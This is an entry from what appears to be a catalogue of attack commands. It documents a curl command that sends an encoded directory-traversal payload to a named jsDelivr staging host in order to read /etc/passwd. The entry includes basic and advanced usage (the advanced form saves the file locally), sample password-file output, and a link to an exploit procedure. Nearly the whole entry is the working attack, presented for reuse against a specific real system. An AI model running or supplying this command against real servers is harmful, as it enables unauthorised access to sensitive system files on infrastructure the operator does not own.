---
id: cmd-curl-jsdelivr-trav-001
data: >-
  curl
  "http://staging.jsdelivr.net//..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af/etc/passwd"
tags:
  - directory-traversal
  - web-exploit
  - file-read
type: command
output: |-
  root:x:0:0:root:/root:/bin/bash
  daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
  bin:x:2:2:bin:/bin:/usr/sbin/nologin
  ...
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:06.118Z'
verified: false
validated: true
submitted: true
---
# curl-directory-traversal-jsdelivr

## Command

```bash
curl "http://staging.jsdelivr.net//..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af/etc/passwd"
```

## Description

This command uses curl to send an HTTP GET request to a specially crafted URL exploiting directory traversal in the jsDelivr staging CDN, retrieving the contents of the sensitive /etc/passwd file.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| URL | The full malicious URL with encoded traversal payloads | Yes |

## Examples

### Basic Usage

```bash
curl "http://staging.jsdelivr.net//..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af/etc/passwd"
```

### Advanced Usage

```bash
curl -v "http://staging.jsdelivr.net//..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af/etc/passwd" > passwd.txt
```

## Expected Output

The command outputs the contents of /etc/passwd, such as user account lines (e.g., "root:x:0:0:root:/root:/bin/bash"). If the vulnerability is patched, it may return a 404 or empty response.

## Related

- [[Related Procedure|procedures/Exploit-Directory-Traversal-in-jsDelivr-Staging-Endpoint]]
